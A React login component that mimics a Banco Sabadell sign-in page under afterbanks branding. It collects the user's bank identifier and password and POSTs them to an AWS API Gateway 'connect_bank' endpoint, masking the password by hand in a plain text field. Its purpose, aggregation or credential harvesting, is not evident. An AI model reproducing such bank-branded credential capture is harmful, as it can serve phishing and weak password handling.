import sabadellLogo from "../assets/logo_sabadell.png";
import afterbanksLogo from "../assets/icon-ab.png";
import iconLock from "../assets/icon-lock.svg";
import iconVisible from "../assets/icon-view.svg";
import iconInvisible from "../assets/icon-invisible.svg";
import { Input } from "@material-tailwind/react";
import { useState } from "react";
import { useNavigate } from "react-router-dom";

interface RequestType {
  u: string;
  p: string;
}

const validateEmail = (email: string): boolean => {
  const isEmailRegex =
    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return !isEmailRegex.test(email);
};

const validatePassword = (password: string): boolean => {
  const hasOneNumber = /\d/;
  const hasOneChar = /[a-zA-Z]/;
  return !(hasOneNumber.test(password) && hasOneChar.test(password));
};

function Login() {
  let [visible, setVisible] = useState(false);
  let [email, setEmail] = useState("");
  let [password, setPassword] = useState("");

  const navigate = useNavigate();

  function handleChange(event: React.FormEvent<HTMLInputElement>) {
    if (event.currentTarget.value.length == 0) {
      setPassword("");
    } else if (event.currentTarget.value.length < password.length) {
      setPassword(password.slice(0, -1));
    } else {
      setPassword(password.concat(event.currentTarget.value.slice(-1)));
    }
  }

  async function handleSubmit(event: React.SyntheticEvent) {
    event.preventDefault();
    if (!validateEmail(email) && !validatePassword(password)) {
      const request: RequestType = { u: email, p: password };
      const response = await fetch(
        "https://xi3z5youw7.execute-api.eu-west-1.amazonaws.com/prod/connect_bank ",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(request),
        }
      );
      if (!response.ok) {
        navigate("/error");
      }
    }
  }

  return (
    <div className="col-start-1 col-end-7 xl:col-start-3 xl:col-end-5 bg-white max-w-md px-16 py-10 shadow-lg rounded-2xl place-items-center mx-auto">
      <div className="flex items-center">
        <img src={sabadellLogo} className="w-16" />
        <h1 className="text-xl md:text-2xl ml-6 font-bold">Banco Sabadell</h1>
      </div>
      <p className="text-gray-600 text-[14px]">
        Escribe tu identificador y contraseña de Banco Sabadell para conectar
        con el banco.
      </p>
      <div className="form my-8 space-y-6">
        <div>
          <Input
            color="indigo"
            label="Identificador"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            error={validateEmail(email)}
          />
          <p className="text-[12px] text-gray-500 mt-6">
            Identificador que pones en la web o app de Banco Sabadell
          </p>
        </div>
        <div>
          <Input
            type={"text"}
            color="indigo"
            label="Contraseña"
            size="lg"
            value={visible ? password : "*".repeat(password.length)}
            onChange={(e) => handleChange(e)}
            error={validatePassword(password)}
            icon={
              visible ? (
                <img
                  src={iconInvisible}
                  onClick={() => setVisible(!visible)}
                  className="w-6 mt-2"
                />
              ) : (
                <img
                  src={iconVisible}
                  onClick={() => setVisible(!visible)}
                  className="w-6 mt-2"
                />
              )
            }
          />
          <p className="text-[12px] text-gray-500 mt-6">
            Contraseña que pones en la web o app de Banco Sabadell
          </p>
          <button
            type="submit"
            onClick={handleSubmit}
            className="text-white mt-8 flex justify-center items-center mx-auto bg-gradient-to-r from-myblue to-mylightblue focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-full text-sm w-4/6 px-2 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800"
          >
            <img src={iconLock} />
            <p className="ml-2 font-bold text-lg">Conectar</p>
          </button>
        </div>
      </div>
      <div className="flex items-center">
        <img src={afterbanksLogo} className="w-10" />
        <p className="text-gray-600 ml-2">
          Conexión segura via{" "}
          <a
            href="https://www.afterbanks.com/"
            target="_blank"
            className="underline"
          >
            afterbanks
          </a>
        </p>
      </div>
    </div>
  );
}

export default Login;
